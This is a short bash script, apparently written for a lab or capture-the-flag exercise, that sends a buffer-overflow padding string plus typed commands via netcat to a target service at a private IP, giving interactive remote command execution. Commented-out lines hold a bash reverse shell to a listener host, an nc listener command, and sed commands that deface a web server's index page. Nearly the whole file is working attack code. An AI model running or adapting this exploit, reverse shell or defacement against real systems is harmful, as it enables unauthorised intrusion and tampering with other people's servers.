overflow=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
#doesnt work
#com="find / -type f -exec cat {} + | grep 'challenge'"

#read file
#com="cat /var/www/html/index.html"

#add tomaz to the file
#com='sed -i "/VM)<\/p>/a<p>Tomaz Silva was here</p>" /var/www/html/index.html'

#delete tomaz
#com='sed -i "/Tomaz/d" /var/www/html/index.html'


#1. do reverse shell - cant get this to work
#com='bash -i >& /dev/tcp/192.168.10.101/4242 0>&1'

#on client do before
#nc -lvnp 4242

#2. input
target_ip="192.168.56.101"
target_port=1234

# Loop for user input
while true; do
    read -p "cmd> " user_input
    [[ "$user_input" == "quit" ]] && break

    # Construct the full payload
    final="${overflow}${user_input}"

    # Send payload using netcat
    echo "$final" | nc $target_ip $target_port | sed -z 's/.*for //'
    
        

done

